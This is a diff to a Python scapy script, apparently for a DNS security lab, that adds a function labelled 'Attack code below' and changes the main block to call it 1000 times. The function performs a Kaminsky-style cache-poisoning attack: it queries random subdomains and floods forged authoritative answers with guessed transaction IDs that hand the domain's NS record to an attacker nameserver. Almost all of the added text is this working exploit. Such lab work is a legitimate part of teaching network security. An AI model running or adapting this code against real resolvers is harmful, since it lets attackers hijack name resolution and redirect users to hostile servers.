@@ -55,5 +55,28 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+'''
+Attack code below
+'''
+DUMMY_DOMAIN = ".example.com"
+def spoofDNS():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+
+    subdomain = getRandomSubDomain()
+    domain = subdomain + DUMMY_DOMAIN
+
+    query = DNSQR(qname=domain)
+    aAns = DNSRR(rrname=domain, type="A", ttl=600, rdata="128.100.8.146")
+    nsAns = DNSRR(rrname="example.com", type="NS", ttl=600, rdata="ns.dnslabattacker.net")
+
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=domain))
+    sendPacket(sock, dnsPacket, my_ip, my_port)
+
+    for i in range(100):
+        packet = DNS(id=getRandomTXID(),aa=1,qr=1,rd=0,ra=0,qd=query,an=aAns,ns=nsAns,qdcount=1,ancount=1,nscount=1)
+        sendPacket(sock,packet, my_ip, my_query_port)
+
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    # exampleSendDNSQuery()
+    for i in range(1000):
+        spoofDNS()
